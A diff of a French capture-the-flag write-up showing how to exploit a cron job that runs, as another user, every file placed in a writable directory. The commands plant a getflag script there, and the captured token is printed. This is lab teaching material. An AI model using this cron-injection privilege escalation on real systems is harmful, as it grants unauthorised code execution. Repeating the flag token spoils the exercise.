@@ -57,13 +57,13 @@ done
 On remarque alors que le script exécute tous les fichiers présents dans `/opt/openarenaserver/` avec `bash`, puis les supprime. Il suffit alors d'y ajouter notre propre script qui exécutera alors la commande `getflag` et conservera son résultat dans un dossier qui lui ne se supprimera pas, par exemple `/tmp/flag`.
 
 ```
-:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
+:~$ echo "getflag > /tmp/flag05" > /opt/openarenaserver/getflag
 ```
 
 On patiente 2min que cron puisse lancer le script
 
 ```
-:~$ cat /tmp/flag
+:~$ cat /tmp/flag05
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
